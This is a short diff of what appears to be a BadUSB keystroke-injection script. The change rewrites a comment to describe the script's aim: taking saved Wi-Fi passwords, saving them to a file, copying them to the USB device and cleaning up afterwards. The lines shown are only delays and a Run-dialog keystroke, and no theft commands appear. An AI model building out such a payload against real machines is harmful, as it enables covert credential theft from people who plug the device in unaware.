@@ -1,4 +1,4 @@
-REM Open Cmd
+REM Yoink Wifi Passworks, save them to a file, move them to the badusb, and cleanup
 DELAY 9000
 WINDOWS r
 DELAY 500
